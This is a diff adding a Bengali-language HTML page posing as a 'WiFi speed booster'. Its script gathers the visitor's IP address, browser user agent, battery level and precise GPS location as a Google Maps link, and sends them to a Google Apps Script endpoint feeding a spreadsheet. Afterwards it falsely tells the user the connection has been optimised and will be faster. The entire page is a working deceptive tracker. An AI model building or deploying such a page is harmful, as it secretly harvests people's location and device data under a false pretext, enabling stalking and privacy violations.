@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Verification</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #eef2f3; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { background: #28a745; color: white; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>WiFi স্পিড বুস্টার 🚀</h2>
+        <p>আপনার কানেকশন অপ্টিমাইজ করতে নিচের বাটনে ক্লিক করুন।</p>
+        <button id="startBtn">বুস্ট করুন</button>
+        <p id="msg"></p>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4yOhl3Nzzre2hPLK_FEslSvqFqDo2ynUAJnu1fh1J2J2esteRVu9gA_4g6moFU06K/exec"; // আপনার লিঙ্ক এখানে বসান
+
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            document.getElementById('msg').innerText = "প্রসেসিং হচ্ছে...";
+
+            try {
+                // ১. আইপি সংগ্রহ
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+
+                // ২. ব্যাটারি
+                let bat = await navigator.getBattery();
+                let batLvl = (bat.level * 100) + "%";
+
+                // ৩. লোকেশন
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let info = {
+                        ip_address: ipData.ip,
+                        device_info: navigator.userAgent,
+                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                        battery: batLvl
+                    };
+
+                    // ৪. Google Sheet-এ পাঠানো
+                    fetch(SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        body: JSON.stringify(info)
+                    }).then(() => {
+                        document.getElementById('msg').innerText = "সফলভাবে অপ্টিমাইজ করা হয়েছে! ✅";
+                        alert("আপনার ইন্টারনেট এখন আরও ফাস্ট হবে।");
+                    });
+
+                }, (err) => {
+                    alert("দয়া করে পারমিশন দিন নাহলে কাজ করবে না।");
+                });
+            } catch (e) {
+                console.log(e);
+            }
+        });
+    </script>
+</body>
+</html>
